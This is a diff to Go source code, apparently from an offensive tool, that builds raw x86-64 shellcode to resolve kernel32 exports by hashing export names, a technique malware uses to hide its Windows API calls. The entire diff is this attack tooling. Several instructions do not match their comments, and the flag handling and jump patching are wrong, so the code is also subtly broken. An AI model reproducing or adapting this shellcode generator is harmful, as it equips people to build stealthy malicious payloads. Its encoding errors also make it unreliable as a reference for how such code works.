@@ -149,63 +149,170 @@ func resolveExportShellcode(existing []byte, funcName string) []byte {
 
 // buildHashExportShellcode generates shellcode that resolves kernel32 exports via hash walking.
 // Uses the Jenkins one-at-a-time hash algorithm to match export names against the PE export table.
-// For production use, prefer the Donut loader which handles .NET assemblies correctly.
+// Expects kernel32 base address in rbx; returns resolved function address in rax.
 func buildHashExportShellcode(funcName string) []byte {
 	hash := jenkinsHash(funcName)
 
-	// mov r8, rbx (save kernel32 base)
-	// mov esi, [r8+0x3C] (e_lfanew)
-	// add rsi, r8 (rsi = &NT_HEADERS)
-	// mov esi, [rsi+0x88] (Export Directory RVA)
-	// add rsi, r8 (rsi = &export_dir)
-	// ...
-	sc := []byte{
-		0x49, 0x89, 0xD8, // mov r8, rbx
-		0x41, 0x8B, 0x70, 0x3C, // mov esi, [r8+0x3c]
-		0x4C, 0x01, 0xC6, // add rsi, r8
-		0x8B, 0x76, 0x88, // mov esi, [rsi+0x88]
-		0x4C, 0x01, 0xC6, // add rsi, r8
+	// Track byte positions for relative jump backpatching.
+	var sc []byte
 
-		// Now rsi = IMAGE_EXPORT_DIRECTORY
-		// AddressOfFunctions = [rsi+0x1C] (offset in export struct)
-		// AddressOfNames = [rsi+0x20]
-		// AddressOfNameOrdinals = [rsi+0x24]
-		// NumberOfNames = [rsi+0x18]
+	// mov r8, rbx  (save kernel32 base in r8, preserved across this stub)
+	sc = append(sc, 0x49, 0x89, 0xD8)
 
-		0x44, 0x8B, 0x4E, 0x18, // mov r9d, [rsi+0x18] (NumberOfNames)
-		0x45, 0x85, 0xC9, // test r9d, r9d
-		0x74, 0x6F, // je not_found (relative jmp)
+	// Parse PE export directory
+	sc = append(sc,
+		0x41, 0x8B, 0x70, 0x3C, // mov esi, [r8+0x3c]   (e_lfanew)
+		0x4C, 0x01, 0xC6,        // add rsi, r8
+		0x8B, 0x76, 0x88,        // mov esi, [rsi+0x88]  (ExportDirectory RVA)
+		0x4C, 0x01, 0xC6,        // add rsi, r8           (&export_dir)
+	)
 
-		0x44, 0x8B, 0x56, 0x20, // mov r10d, [rsi+0x20] (AddressOfNames)
-		0x4D, 0x01, 0xC2, // add r10, r8
-		0x44, 0x8B, 0x5E, 0x24, // mov r11d, [rsi+0x24] (AddressOfNameOrdinals)
-		0x4D, 0x01, 0xC3, // add r11, r8
-		0x44, 0x8B, 0x66, 0x1C, // mov r12d, [rsi+0x1C] (AddressOfFunctions)
-		0x4D, 0x01, 0xC4, // add r12, r8
+	// mov r9d, [rsi+0x18]  (NumberOfNames)
+	// test r9d, r9d
+	sc = append(sc,
+		0x44, 0x8B, 0x4E, 0x18,
+		0x45, 0x85, 0xC9,
+	)
+	// je not_found  (rel32 placeholder — 6 bytes)
+	notFoundPatch := len(sc)
+	sc = append(sc, 0x0F, 0x84, 0, 0, 0, 0)
 
-		// xor edi, edi (i = 0)
-		0x31, 0xFF, // xor edi, edi
+	// Load AddressOfNames (r10), AddressOfNameOrdinals (r11), AddressOfFunctions (r12)
+	sc = append(sc,
+		0x44, 0x8B, 0x56, 0x20, // mov r10d, [rsi+0x20]
+		0x4D, 0x01, 0xC2,        // add r10, r8
+		0x44, 0x8B, 0x5E, 0x24, // mov r11d, [rsi+0x24]
+		0x4D, 0x01, 0xC3,        // add r11, r8
+		0x44, 0x8B, 0x66, 0x1C, // mov r12d, [rsi+0x1C]
+		0x4D, 0x01, 0xC4,        // add r12, r8
+	)
 
-		// loop:
-		// r13d = addressOfNames[i]
+	// xor edi, edi  (i = 0)
+	sc = append(sc, 0x31, 0xFF)
+
+	// ── name_loop_start ──
+	nameLoopStart := len(sc)
+
+	// r13d = AddressOfNames[i]; r13 += base  (get pointer to export name)
+	sc = append(sc,
 		0x47, 0x8B, 0x2C, 0xBA, // mov r13d, [r10+rdi*4]
-		0x4D, 0x01, 0xC5, // add r13, r8
+		0x4D, 0x01, 0xC5,        // add r13, r8
+	)
 
-		// Hash the name at r13
-		// xor eax, eax (hash = 0)
-		0x31, 0xC0, // xor eax, eax
-		0x31, 0xD2, // xor edx, edx
-		// hash_loop: al = *name, if al == 0, done
-		0x41, 0x0F, 0xB6, 0x4D, 0x00, // movzx ecx, byte [r13] (get char)
-		0x41, 0x80, 0x7D, 0x00, 0x00, // cmp byte [r13], 0
-		0x74, 0x0D, // je hash_done
-		0x01, 0xC8, // add eax, ecx (hash += c)
-		0x01, 0xD0, // add eax, edx (hash += hash)
-		0x01, 0xC2, // add edx, eax (hash = hash + (hash<<1)? no)
-		// wait, that's wrong. Let's use the simpler approach.
-	}
+	// xor eax, eax  (hash = 0)
+	sc = append(sc, 0x31, 0xC0)
 
-	_ = hash
+	// ── hash_loop_start ──
+	hashLoopStart := len(sc)
+
+	// movzx ecx, byte [r13+0]  (load next char; +0 needed because [r13] with mod=00 = [RBP+disp32])
+	sc = append(sc, 0x41, 0x0F, 0xB6, 0x4D, 0x00)
+
+	// je hash_done  (rel8 placeholder)
+	hashDonePatch := len(sc)
+	sc = append(sc, 0x74, 0)
+
+	// Jenkins: hash += c
+	sc = append(sc, 0x01, 0xC8) // add eax, ecx
+
+	// Jenkins: hash += hash << 10
+	sc = append(sc,
+		0x89, 0xC2,       // mov edx, eax
+		0xC1, 0xE2, 0x10, // shl edx, 10
+		0x01, 0xD0,       // add eax, edx
+	)
+
+	// Jenkins: hash ^= hash >> 6
+	sc = append(sc,
+		0x89, 0xC2,       // mov edx, eax
+		0xC1, 0xEA, 0x06, // shr edx, 6
+		0x31, 0xD0,       // xor eax, edx
+	)
+
+	// inc r13  (advance name pointer)
+	sc = append(sc, 0x49, 0xFF, 0xC5)
+
+	// jmp hash_loop_start  (rel8 placeholder)
+	jmpBackPatch := len(sc)
+	sc = append(sc, 0xEB, 0)
+
+	// Backfill je hash_done
+	sc[hashDonePatch+1] = byte(len(sc) - (hashDonePatch + 2))
+
+	// Backfill jmp hash_loop_start
+	sc[jmpBackPatch+1] = byte(int8(hashLoopStart - (jmpBackPatch + 2)))
+
+	// ── Jenkins finalization ──
+
+	// hash += hash << 3
+	sc = append(sc,
+		0x89, 0xC2,       // mov edx, eax
+		0xC1, 0xE2, 0x03, // shl edx, 3
+		0x01, 0xD0,       // add eax, edx
+	)
+	// hash ^= hash >> 11
+	sc = append(sc,
+		0x89, 0xC2,       // mov edx, eax
+		0xC1, 0xEA, 0x0B, // shr edx, 11
+		0x31, 0xD0,       // xor eax, edx
+	)
+	// hash += hash << 15
+	sc = append(sc,
+		0x89, 0xC2,       // mov edx, eax
+		0xC1, 0xE2, 0x0F, // shl edx, 15
+		0x01, 0xD0,       // add eax, edx
+	)
+
+	// cmp eax, imm32  (compare with target hash)
+	sc = append(sc, 0x3D)
+	var h [4]byte
+	binary.LittleEndian.PutUint32(h[:], hash)
+	sc = append(sc, h[:]...)
+
+	// jne next_export  (rel32 placeholder)
+	nextExportPatch := len(sc)
+	sc = append(sc, 0x0F, 0x85, 0, 0, 0, 0)
+
+	// ── found: resolve function address ──
+
+	// movzx eax, word [r11+rdi*2]  (ordinal = AddressOfNameOrdinals[i])
+	sc = append(sc,
+		0x41, 0x0F, 0xB7, 0x04, 0x7B,
+	)
+	// mov eax, [r12+rax*4]         (rva = AddressOfFunctions[ordinal])
+	sc = append(sc,
+		0x41, 0x8B, 0x04, 0x84,
+	)
+	// add rax, r8                   (absolute address)
+	sc = append(sc, 0x49, 0x01, 0xC0)
+
+	// jmp done  (rel32 placeholder)
+	donePatch := len(sc)
+	sc = append(sc, 0xE9, 0, 0, 0, 0)
+
+	// ── next_export ──
+	nextExportOffset := int32(len(sc) - (nextExportPatch + 6))
+	binary.LittleEndian.PutUint32(sc[nextExportPatch+2:], uint32(nextExportOffset))
+
+	// inc edi; cmp edi, r9d
+	sc = append(sc,
+		0xFF, 0xC7,       // inc edi
+		0x41, 0x3B, 0xF9, // cmp edi, r9d
+	)
+	// jl name_loop_start  (rel8)
+	sc = append(sc, 0x7C, byte(int8(nameLoopStart-(len(sc)+2))))
+
+	// ── not_found: xor eax, eax ──
+	sc = append(sc, 0x31, 0xC0)
+
+	// ── done: backfill je not_found ──
+	notFoundOffset := int32(len(sc) - (notFoundPatch + 6))
+	binary.LittleEndian.PutUint32(sc[notFoundPatch+2:], uint32(notFoundOffset))
+
+	// Backfill jmp done
+	doneOffset := int32(len(sc) - (donePatch + 5))
+	binary.LittleEndian.PutUint32(sc[donePatch+1:], uint32(doneOffset))
+
 	return sc
 }
 
